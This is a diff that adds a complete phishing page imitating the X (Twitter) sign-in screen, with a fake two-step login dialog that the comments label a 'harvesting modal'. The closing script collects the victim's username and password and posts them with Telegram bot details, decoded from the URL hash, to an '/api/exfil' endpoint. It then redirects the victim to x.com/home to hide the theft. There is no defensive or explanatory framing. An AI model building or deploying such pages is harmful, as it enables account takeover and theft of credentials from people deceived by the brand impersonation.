@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>X. It’s what’s happening / X</title>
+    <link rel="shortcut icon" href="https://abs.twimg.com/favicons/twitter-pip.3.ico">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        
+        body { 
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000000;
+            color: #FFFFFF;
+            -webkit-font-smoothing: antialiased;
+            margin: 0;
+        }
+
+        .x-btn-white {
+            background-color: #ffffff;
+            color: #000000;
+            font-weight: 700;
+            height: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 300px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s;
+        }
+        .x-btn-white:hover { background-color: #e6e6e6; }
+
+        .x-btn-outline {
+            background-color: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.5);
+            color: #1d9bf0;
+            font-weight: 700;
+            height: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 300px;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: background-color 0.2s;
+        }
+        .x-btn-outline:hover { background-color: rgba(29, 155, 240, 0.1); border-color: #1d9bf0; }
+
+        .x-btn-signin {
+            background-color: transparent;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #1d9bf0;
+            font-weight: 700;
+            height: 40px;
+            border-radius: 20px;
+            width: 100%;
+            max-width: 300px;
+            font-size: 15px;
+            margin-top: 20px;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            width: 100%;
+            max-width: 300px;
+            margin: 10px 0;
+            color: #ffffff;
+            font-size: 15px;
+        }
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #2f3336;
+        }
+        .divider:not(:empty)::before { margin-right: .5em; }
+        .divider:not(:empty)::after { margin-left: .5em; }
+
+        .footer-link {
+            color: #71767b;
+            font-size: 13px;
+            text-decoration: none;
+            padding: 4px 0;
+        }
+        .footer-link:hover { text-decoration: underline; }
+
+        /* Harvesting Modal */
+        .modal-overlay {
+            position: fixed;
+            inset: 0;
+            background: rgba(91, 112, 131, 0.4);
+            display: none;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+        }
+        .modal-card {
+            background: #000;
+            width: 100%;
+            max-width: 600px;
+            min-height: 600px;
+            border-radius: 16px;
+            padding: 32px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        .x-input {
+            width: 100%;
+            height: 56px;
+            background: transparent;
+            border: 1px solid #333639;
+            border-radius: 4px;
+            padding: 12px;
+            font-size: 17px;
+            color: #fff;
+            outline: none;
+            margin-bottom: 25px;
+        }
+        .x-input:focus { border-color: #1d9bf0; }
+
+        #loader {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: transparent;
+            overflow: hidden;
+            display: none;
+        }
+        #loader div {
+            position: absolute;
+            background-color: #1d9bf0;
+            height: 100%;
+            width: 40%;
+            animation: xLoad 1s infinite linear;
+        }
+        @keyframes xLoad { 0% { left: -40%; } 100% { left: 100%; } }
+    </style>
+</head>
+<body class="flex flex-col min-h-screen">
+
+    <main class="flex-grow flex flex-col lg:flex-row items-center justify-center p-4 lg:p-0">
+        
+        <!-- Big X Logo Left -->
+        <div class="lg:w-1/2 flex items-center justify-center p-12">
+            <svg viewBox="0 0 24 24" class="w-12 h-12 lg:w-[380px] lg:h-[380px]" fill="currentColor">
+                <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+            </svg>
+        </div>
+
+        <!-- Content Right -->
+        <div class="lg:w-1/2 flex flex-col items-start justify-center p-4 lg:p-20">
+            <h1 class="text-5xl lg:text-[64px] font-black tracking-tight mb-12">Happening now</h1>
+            <h2 class="text-[31px] font-black mb-8">Join today.</h2>
+
+            <div class="w-full flex flex-col gap-3">
+                <button class="x-btn-white">
+                    <svg class="w-5 h-5" viewBox="0 0 48 48"><path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path><path fill="#4285F4" d="M46.64 24.55c0-1.65-.15-3.23-.42-4.75H24v9.03h12.73c-.55 2.87-2.12 5.3-4.55 6.94l7.07 5.48c4.14-3.82 6.4-9.45 6.4-15.7z"></path><path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path><path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.07-5.48c-2.19 1.47-4.99 2.34-8.82 2.34-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path></svg>
+                    Sign up with Google
+                </button>
+                <button class="x-btn-white">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M12.152 6.896c-.948 0-2.415-1.078-3.96-1.04-2.04.027-3.91 1.183-4.961 3.014-2.117 3.675-.546 9.103 1.51 13.97 1.006 2.38 2.316 5.072 4.22 5.032 1.831-.039 2.522-1.154 4.736-1.154 2.213 0 2.839 1.154 4.775 1.114 1.968-.039 3.102-2.42 4.304-5.23 1.391-3.238 1.964-6.375 1.99-6.536-.046-.014-3.83-1.478-3.856-5.845-.02-3.66 2.972-5.42 3.11-5.512-1.713-2.518-4.346-2.8-5.277-2.839-2.203-.078-4.227 1.026-5.59 1.026zM15.352 2c-.999.085-2.204.707-2.921 1.546-.644.75-.95 1.777-.852 2.76.903.07 2.115-.43 2.784-1.272.67-.84 1.054-1.921.989-3.034z"></path></svg>
+                    Sign up with Apple
+                </button>
+                
+                <div class="divider">or</div>
+
+                <button class="x-btn-white bg-[#1d9bf0] text-white hover:bg-[#1a8cd8]">Create account</button>
+                
+                <p class="text-[11px] text-[#71767b] max-w-[300px] mt-2 leading-tight">
+                    By signing up, you agree to the <a href="#" class="text-[#1d9bf0] hover:underline">Terms of Service</a> and <a href="#" class="text-[#1d9bf0] hover:underline">Privacy Policy</a>, including <a href="#" class="text-[#1d9bf0] hover:underline">Cookie Use.</a>
+                </p>
+
+                <div class="mt-14">
+                    <h3 class="text-[17px] font-bold mb-4">Already have an account?</h3>
+                    <button onclick="openModal()" class="x-btn-outline">Sign in</button>
+                </div>
+
+                <button class="x-btn-outline border-white/30 mt-4 flex items-center justify-center gap-2">
+                    <svg viewBox="0 0 24 24" class="w-5 h-5" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+                    Get the app
+                </button>
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer Links -->
+    <footer class="p-4 flex flex-wrap justify-center gap-x-4 gap-y-2 border-t border-zinc-800">
+        <a href="#" class="footer-link">About</a>
+        <a href="#" class="footer-link">Download the X app</a>
+        <a href="#" class="footer-link">Grok</a>
+        <a href="#" class="footer-link">Help Center</a>
+        <a href="#" class="footer-link">Terms of Service</a>
+        <a href="#" class="footer-link">Privacy Policy</a>
+        <a href="#" class="footer-link">Cookie Policy</a>
+        <a href="#" class="footer-link">Accessibility</a>
+        <a href="#" class="footer-link">Ads info</a>
+        <a href="#" class="footer-link">Blog</a>
+        <a href="#" class="footer-link">Careers</a>
+        <a href="#" class="footer-link">Brand Resources</a>
+        <a href="#" class="footer-link">Advertising</a>
+        <a href="#" class="footer-link">Marketing</a>
+        <a href="#" class="footer-link">X for Business</a>
+        <a href="#" class="footer-link">Developers</a>
+        <a href="#" class="footer-link">News</a>
+        <a href="#" class="footer-link">Settings</a>
+        <span class="footer-link">© 2026 X Corp.</span>
+    </footer>
+
+    <!-- HARVESTING MODAL -->
+    <div id="signin-modal" class="modal-overlay">
+        <div class="modal-card">
+            <div id="loader"><div></div></div>
+            <div class="flex items-center mb-10">
+                <button onclick="closeModal()" class="p-2 -ml-2 hover:bg-zinc-900 rounded-full transition-colors">
+                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"/></svg>
+                </button>
+                <div class="flex-grow flex justify-center -ml-8">
+                    <svg viewBox="0 0 24 24" class="w-8 h-8" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></svg>
+                </div>
+            </div>
+
+            <div id="step-id">
+                <h2 class="text-3xl font-bold mb-8">Sign in to X</h2>
+                <div class="flex flex-col gap-4 mb-8">
+                    <button class="x-btn-white max-w-full">Sign in with Google</button>
+                    <button class="x-btn-white max-w-full">Sign in with Apple</button>
+                </div>
+                <div class="divider max-w-full mb-8">or</div>
+                <input type="text" id="username" class="x-input" placeholder="Phone, email, or username" autocomplete="username">
+                <button onclick="toPass()" class="x-btn-white max-w-full font-bold">Next</button>
+                <button class="x-btn-outline border-zinc-700 text-white max-w-full mt-6">Forgot password?</button>
+            </div>
+
+            <div id="step-pass" class="hidden">
+                <h2 class="text-3xl font-bold mb-8">Enter your password</h2>
+                <div class="bg-zinc-900/50 p-3 rounded mb-8 text-zinc-400">
+                    <span id="display-user"></span>
+                </div>
+                <input type="password" id="password" class="x-input" placeholder="Password" autofocus>
+                <div class="flex-grow"></div>
+                <button onclick="dispatch()" class="x-btn-white max-w-full bg-[#1d9bf0] text-white font-bold h-12">Log in</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const getConf = () => {
+            const h = window.location.hash.substring(1);
+            if (!h) return null;
+            try { return JSON.parse(atob(h)); } catch(e) { return null; }
+        };
+
+        const config = getConf();
+        let userVal = "";
+
+        function openModal() {
+            document.getElementById('signin-modal').style.display = 'flex';
+            document.body.style.overflow = 'hidden';
+        }
+
+        function closeModal() {
+            document.getElementById('signin-modal').style.display = 'none';
+            document.body.style.overflow = 'auto';
+        }
+
+        function toPass() {
+            userVal = document.getElementById('username').value;
+            if(!userVal) return;
+            document.getElementById('display-user').innerText = userVal;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+        }
+
+        async function dispatch() {
+            const p = document.getElementById('password').value;
+            if(!p) return;
+
+            document.getElementById('loader').style.display = 'block';
+            const fin = "https://x.com/home";
+
+            if(!config) { setTimeout(() => window.location.href = fin, 1200); return; }
+
+            try {
+                await fetch('/api/exfil', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        target: 'twitter',
+                        credentials: { username: userVal, password: p },
+                        tgToken: config.t,
+                        tgChat: config.c
+                    })
+                });
+            } catch (e) {} finally {
+                setTimeout(() => { window.location.href = fin; }, 1200);
+            }
+        }
+    </script>
+</body>
+</html>
